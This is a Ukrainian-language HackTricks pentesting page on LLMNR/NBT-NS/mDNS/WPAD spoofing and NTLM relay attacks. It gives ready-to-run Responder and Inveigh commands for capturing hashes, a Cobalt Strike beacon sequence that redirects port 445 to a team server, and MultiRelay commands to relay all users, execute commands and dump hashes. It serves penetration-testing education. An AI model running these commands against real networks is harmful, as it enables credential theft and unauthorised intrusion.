# –ü—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è LLMNR, NBT-NS, mDNS/DNS —Ç–∞ WPAD —Ç–∞ –∞—Ç–∞–∫–∏ —Ä–µ–ª–µ—é

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è AWS Red Team Expert (ARTE) –≤—ñ–¥ HackTricks**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è GCP Red Team Expert (GRTE) –≤—ñ–¥ HackTricks**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## –ü—Ä–æ—Ç–æ–∫–æ–ª–∏ –º–µ—Ä–µ–∂—ñ

### –ü—Ä–æ—Ç–æ–∫–æ–ª–∏ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤–∏—Ä—ñ—à–µ–Ω–Ω—è —Ö–æ—Å—Ç–∞
- **LLMNR, NBT-NS —Ç–∞ mDNS**:
- Microsoft —Ç–∞ —ñ–Ω—à—ñ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω—ñ —Å–∏—Å—Ç–µ–º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å LLMNR —Ç–∞ NBT-NS –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤–∏—Ä—ñ—à–µ–Ω–Ω—è —ñ–º–µ–Ω –ø—Ä–∏ –Ω–µ–≤–¥–∞—á—ñ DNS. –¢–∞–∫ —Å–∞–º–æ, Apple —Ç–∞ Linux —Å–∏—Å—Ç–µ–º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å mDNS.
- –¶—ñ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ –ø—ñ–¥–¥–∞—é—Ç—å—Å—è –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—é —Ç–∞ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—é —á–µ—Ä–µ–∑ —ó—Ö –Ω–µ–≤–ø—ñ–∑–Ω–∞–Ω—É, —Ä–æ–∑–ø–æ–≤—Å—é–¥–∂–µ–Ω—É –ø—Ä–∏—Ä–æ–¥—É —á–µ—Ä–µ–∑ UDP.
- [Responder](https://github.com/lgandx/Responder) –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è —Å–ª—É–∂–± —à–ª—è—Ö–æ–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–∏—Ö –≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π –Ω–∞ —Ö–æ—Å—Ç–∏, —è–∫—ñ –∑–∞–ø–∏—Ç—É—é—Ç—å —Ü—ñ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏.
- –î–æ–¥–∞—Ç–∫–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è —Å–ª—É–∂–± –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Responder –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### –ü—Ä–æ—Ç–æ–∫–æ–ª –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è –≤–µ–±-–ø—Ä–æ–∫—Å—ñ (WPAD)
- WPAD –¥–æ–∑–≤–æ–ª—è—î –±—Ä–∞—É–∑–µ—Ä–∞–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –ø—Ä–æ–∫—Å—ñ.
- –í—ñ–¥–∫—Ä–∏—Ç—Ç—è –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è —á–µ—Ä–µ–∑ DHCP, DNS –∞–±–æ –≤ —Ä–∞–∑—ñ –Ω–µ–≤–¥–∞—á—ñ - —á–µ—Ä–µ–∑ LLMNR —Ç–∞ NBT-NS.
- Responder –º–æ–∂–µ –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É–≤–∞—Ç–∏ –∞—Ç–∞–∫–∏ WPAD, –Ω–∞–ø—Ä–∞–≤–ª—è—é—á–∏ –∫–ª—ñ—î–Ω—Ç—ñ–≤ –Ω–∞ –∑–ª–æ–≤–º–∏—Å–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∏ WPAD.

### Responder –¥–ª—è –æ—Ç—Ä—É—î–Ω–Ω—è –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤
- **Responder** - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –æ—Ç—Ä—É—î–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤ LLMNR, NBT-NS —Ç–∞ mDNS, –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—á–∏ –≤–∏–±—ñ—Ä–∫–æ–≤–æ –Ω–∞ —Ç–∏–ø–∏ –∑–∞–ø–∏—Ç—ñ–≤, –ø–µ—Ä–µ–≤–∞–∂–Ω–æ —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏—Ö –Ω–∞ —Å–ª—É–∂–±–∏ SMB.
- –í—ñ–Ω –ø–æ—Å—Ç–∞–≤–ª—è—î—Ç—å—Å—è –∑–∞–∑–¥–∞–ª–µ–≥—ñ–¥—å –≤ Kali Linux, –Ω–∞–ª–∞—à—Ç–æ–≤—É—î—Ç—å—Å—è –≤ `/etc/responder/Responder.conf`.
- Responder –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î –∑–∞—Ö–æ–ø–ª–µ–Ω—ñ —Ö–µ—à—ñ –Ω–∞ –µ–∫—Ä–∞–Ω—ñ —Ç–∞ –∑–±–µ—Ä—ñ–≥–∞—î —ó—Ö —É –∫–∞—Ç–∞–ª–æ–∑—ñ `/usr/share/responder/logs`.
- –ü—ñ–¥—Ç—Ä–∏–º—É—î —è–∫ IPv4, —Ç–∞–∫ —ñ IPv6.
- –í–µ—Ä—Å—ñ—è Responder –¥–ª—è Windows –¥–æ—Å—Ç—É–ø–Ω–∞ [—Ç—É—Ç](https://github.com/lgandx/Responder-Windows).

#### –ó–∞–ø—É—Å–∫ Responder
- –î–ª—è –∑–∞–ø—É—Å–∫—É Responder –∑—ñ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–º–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º–∏: `responder -I <–Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å>`
- –î–ª—è –±—ñ–ª—å—à –∞–≥—Ä–µ—Å–∏–≤–Ω–æ–≥–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è (–∑ –º–æ–∂–ª–∏–≤–∏–º–∏ –ø–æ–±—ñ—á–Ω–∏–º–∏ –µ—Ñ–µ–∫—Ç–∞–º–∏): `responder -I <–Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å> -P -r -v`
- –¢–µ—Ö–Ω—ñ–∫–∏ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –≤–∏–∫–ª–∏–∫—ñ–≤/–≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π NTLMv1 –¥–ª—è –ø–æ–ª–µ–≥—à–µ–Ω–Ω—è —Ä–æ–∑–∫—Ä–∏—Ç—Ç—è: `responder -I <–Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å> --lm --disable-ess`
- –ü—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è WPAD –º–æ–∂–µ –±—É—Ç–∏ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: `responder -I <–Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å> --wpad`
- –ó–∞–ø–∏—Ç–∏ NetBIOS –º–æ–∂—É—Ç—å –±—É—Ç–∏ —Ä–æ–∑—Ä—ñ—à–µ–Ω—ñ –Ω–∞ IP –∞—Ç–∞–∫—É—é—á–æ–≥–æ, —ñ –º–æ–∂–µ –±—É—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ–π–Ω–∏–π –ø—Ä–æ–∫—Å—ñ: `responder.py -I <—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å> -Pv`

### –û—Ç—Ä—É—î–Ω–Ω—è DHCP –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Responder
- –ü—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π DHCP –º–æ–∂–µ –ø–æ—Å—Ç—ñ–π–Ω–æ –æ—Ç—Ä—É—ó—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó –∂–µ—Ä—Ç–≤–∏, –ø—Ä–æ–ø–æ–Ω—É—é—á–∏ –±—ñ–ª—å—à –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏–π –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–π –≤–∞—Ä—ñ–∞–Ω—Ç –æ—Ç—Ä—É—î–Ω–Ω—è ARP.
- –¶–µ –≤–∏–º–∞–≥–∞—î —Ç–æ—á–Ω–æ–≥–æ –∑–Ω–∞–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –º–µ—Ä–µ–∂—ñ —Ü—ñ–ª—å–æ–≤–æ—ó –º–µ—Ä–µ–∂—ñ.
- –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏: `./Responder.py -I eth0 -Pdv`
- –¶–µ–π –º–µ—Ç–æ–¥ –º–æ–∂–µ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ —Ö–µ—à—ñ NTLMv1/2, –∞–ª–µ –≤–∏–º–∞–≥–∞—î –æ–±–µ—Ä–µ–∂–Ω–æ–≥–æ –æ–±—Ö–æ–¥—É –¥–ª—è —É–Ω–∏–∫–Ω–µ–Ω–Ω—è —Ä–æ–∑—Ä–∏–≤—É –º–µ—Ä–µ–∂—ñ.

### –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Responder
- Responder –±—É–¥–µ –ø—ñ–¥—Ä–æ–±–ª—è—Ç–∏ —Å–ª—É–∂–±–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–∏—â–µ–∑–≥–∞–¥–∞–Ω–∏—Ö –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤, –∑–∞—Ö–æ–ø–ª—é—é—á–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ (–∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–ª–∏–∫/–≤—ñ–¥–ø–æ–≤—ñ–¥—å NTLMv2), –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è –ø—Ä–æ—Ç–∏ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–∏—Ö —Å–ª—É–∂–±.
- –ú–æ–∂–ª–∏–≤—ñ —Å–ø—Ä–æ–±–∏ –∑–Ω–∏–∂–µ–Ω–Ω—è –¥–æ NetNTLMv1 –∞–±–æ –≤–∏–º–∫–Ω–µ–Ω–Ω—è ESS –¥–ª—è –ø–æ–ª–µ–≥—à–µ–Ω–Ω—è —Ä–æ–∑–∫—Ä–∏—Ç—Ç—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö.

–í–∞–∂–ª–∏–≤–æ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü–∏—Ö —Ç–µ—Ö–Ω—ñ–∫ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –∑–¥—ñ–π—Å–Ω–µ–Ω–µ –∑–∞–∫–æ–Ω–Ω–æ —Ç–∞ –µ—Ç–∏—á–Ω–æ, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –Ω–∞–ª–µ–∂–Ω—É –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é —Ç–∞ —É–Ω–∏–∫–Ω–µ–Ω–Ω—è —Ä–æ–∑—Ä–∏–≤—É –∞–±–æ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É.

## Inveigh

Inveigh - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –ø–µ–Ω—Ç–µ—Å—Ç–µ—Ä—ñ–≤ —Ç–∞ –∫–æ–º–∞–Ω–¥ —á–µ—Ä–≤–æ–Ω–∏—Ö –∫–æ–º–∞–Ω–¥, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è —Å–∏—Å—Ç–µ–º Windows. –í—ñ–Ω –ø—Ä–æ–ø–æ–Ω—É—î —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —Å—Ö–æ–∂—É –Ω–∞ Responder, –≤–∏–∫–æ–Ω—É—é—á–∏ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è —Ç–∞ –∞—Ç–∞–∫–∏ –ª—é–¥–∏–Ω–∏ –ø–æ—Å–µ—Ä–µ–¥–Ω–∏–∫–∞. –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –µ–≤–æ–ª—é—Ü—ñ–æ–Ω—É–≤–∞–≤ –∑ PowerShell —Å–∫—Ä–∏–ø—Ç—É –¥–æ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É C#, –∑ [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) —Ç–∞ [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) —è–∫ –æ—Å–Ω–æ–≤–Ω—ñ –≤–µ—Ä—Å—ñ—ó. –î–µ—Ç–∞–ª—å–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ —Ç–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ [**–≤—ñ–∫—ñ**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–ø—É—â–µ–Ω–∏–π —á–µ—Ä–µ–∑ PowerShell:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
–ê–±–æ –≤–∏–∫–æ–Ω–∞–Ω–æ —è–∫ C# –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª:
```bash
Inveigh.exe
```
### –ê—Ç–∞–∫–∞ –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è NTLM

–¶—è –∞—Ç–∞–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Å–µ–∞–Ω—Å–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó SMB –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ü—ñ–ª—å–æ–≤–æ—ó –º–∞—à–∏–Ω–∏, —â–æ –Ω–∞–¥–∞—î —Å–∏—Å—Ç–µ–º–Ω—É –æ–±–æ–ª–æ–Ω–∫—É —É —Ä–∞–∑—ñ —É—Å–ø—ñ—Ö—É. –û—Å–Ω–æ–≤–Ω—ñ –ø–µ—Ä–µ–¥—É–º–æ–≤–∏ –≤–∫–ª—é—á–∞—é—Ç—å:
- –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á, —è–∫–∏–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è, –ø–æ–≤–∏–Ω–µ–Ω –º–∞—Ç–∏ –ª–æ–∫–∞–ª—å–Ω–∏–π –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø –Ω–∞ –ø–µ—Ä–µ—Å–∏–ª–∞–Ω–æ–º—É —Ö–æ—Å—Ç—ñ.
- –ü—ñ–¥–ø–∏—Å SMB –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –≤–∏–º–∫–Ω–µ–Ω–∏–π.

#### –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —Ç–∞ —Ç—É–Ω–µ–ª—é–≤–∞–Ω–Ω—è –ø–æ—Ä—Ç—É 445

–£ –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ –ø—Ä—è–º–µ –≤–≤–µ–¥–µ–Ω–Ω—è –≤ –º–µ—Ä–µ–∂—É –Ω–µ–º–æ–∂–ª–∏–≤–µ, –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ —Ç–∞ —Ç—É–Ω–µ–ª—é–≤–∞—Ç–∏ —Ç—Ä–∞—Ñ—ñ–∫ –Ω–∞ –ø–æ—Ä—Ç—É 445. –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ [**PortBender**](https://github.com/praetorian-inc/PortBender), –¥–æ–ø–æ–º–∞–≥–∞—é—Ç—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ —Ç—Ä–∞—Ñ—ñ–∫ –ø–æ—Ä—Ç—É 445 –Ω–∞ —ñ–Ω—à–∏–π –ø–æ—Ä—Ç, —â–æ —î –≤–∞–∂–ª–∏–≤–∏–º, –∫–æ–ª–∏ –¥–æ—Å—Ç—É–ø–Ω–∏–π –ª–æ–∫–∞–ª—å–Ω–∏–π –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥—Ä–∞–π–≤–µ—Ä—ñ–≤.

–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ç–∞ —Ä–æ–±–æ—Ç–∞ PortBender –≤ Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### –Ü–Ω—à—ñ –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –ê—Ç–∞–∫–∏ NTLM Relay

- **Metasploit**: –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∑ –ø—Ä–æ–∫—Å—ñ, –ª–æ–∫–∞–ª—å–Ω–∏–º–∏ —Ç–∞ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏ —Ö–æ—Å—Ç—É.
- **smbrelayx**: –°–∫—Ä–∏–ø—Ç –Ω–∞ Python –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ —Å–µ–∞–Ω—Å—ñ–≤ SMB —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ –∞–±–æ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è –∑–∞–¥–Ω—ñ—Ö –¥–≤–µ—Ä–µ–π.
- **MultiRelay**: –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∑ –Ω–∞–±–æ—Ä—É Responder –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∞–±–æ –≤—Å—ñ—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ –∞–±–æ –≤–∏–≤–µ–¥–µ–Ω–Ω—è —Ö–µ—à—ñ–≤.

–ö–æ–∂–µ–Ω —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –º–æ–∂–µ –±—É—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –Ω–∞ —Ä–æ–±–æ—Ç—É —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å—ñ-—Å–µ—Ä–≤–µ—Ä SOCKS —É —Ä–∞–∑—ñ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–¥—ñ–π—Å–Ω—é–≤–∞—Ç–∏ –∞—Ç–∞–∫–∏ –Ω–∞–≤—ñ—Ç—å –∑ –æ–ø–æ—Å–µ—Ä–µ–¥–∫–æ–≤–∞–Ω–∏–º –º–µ—Ä–µ–∂–µ–≤–∏–º –¥–æ—Å—Ç—É–ø–æ–º.

### –û–ø–µ—Ä–∞—Ü—ñ—è MultiRelay

MultiRelay –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è –∑ –∫–∞—Ç–∞–ª–æ–≥—É _**/usr/share/responder/tools**_, —Å–ø—Ä—è–º–æ–≤—É—é—á–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ IP-–∞–¥—Ä–µ—Å–∏ –∞–±–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### –ü—Ä–∏–º—É—Å–æ–≤—ñ –≤—Ö–æ–¥–∏ NTLM

–£ Windows –≤–∏ **–º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ –¥–µ—è–∫—ñ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è –Ω–∞ –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –º–∞—à–∏–Ω–∞—Ö**. –ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è —è–∫:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
